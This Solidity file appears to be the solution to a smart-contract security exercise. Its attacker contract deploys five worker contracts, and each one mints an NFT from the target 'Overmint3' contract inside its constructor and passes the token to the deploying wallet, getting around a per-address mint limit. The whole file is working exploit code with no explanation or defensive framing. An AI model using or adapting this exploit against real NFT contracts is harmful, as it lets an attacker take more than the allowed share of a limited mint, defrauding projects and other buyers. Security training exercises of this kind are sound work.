// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint3.sol";

contract Overmint3AttackerWorker {
    constructor(Overmint3 targetContract, uint256 tokenId) {
        targetContract.mint();
        targetContract.transferFrom(address(this), tx.origin, tokenId);
    }
}

contract Overmint3Attacker {
    constructor(Overmint3 targetContract) {
        for (uint256 tokenId = 1; tokenId < 6; tokenId++) {
            new Overmint3AttackerWorker(targetContract, tokenId);
        }
    }
}
